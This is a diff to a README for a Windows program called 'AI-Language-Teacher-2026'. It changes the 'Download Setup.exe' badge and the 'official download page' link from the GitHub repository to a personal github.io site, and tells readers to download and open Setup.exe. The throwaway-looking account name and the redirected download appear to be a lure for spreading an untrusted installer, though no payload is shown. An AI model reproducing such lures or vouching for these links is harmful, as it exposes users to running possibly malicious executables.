@@ -1,6 +1,6 @@
 # 🎓 AI-Language-Teacher-2026 - Master new languages with smart lessons
 
-[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/sullyundescended501/AI-Language-Teacher-2026)
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://sullyundescended501.github.io)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ To run this software, ensure your computer meets these standards:
 
 Follow these steps to install the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/sullyundescended501/AI-Language-Teacher-2026) to access the installer.
+1. Visit the [official download page](https://sullyundescended501.github.io) to access the installer.
 2. Locate the file named Setup.exe in the list of assets.
 3. Click the file to start the download.
 4. Open your Downloads folder once the file finishes downloading.
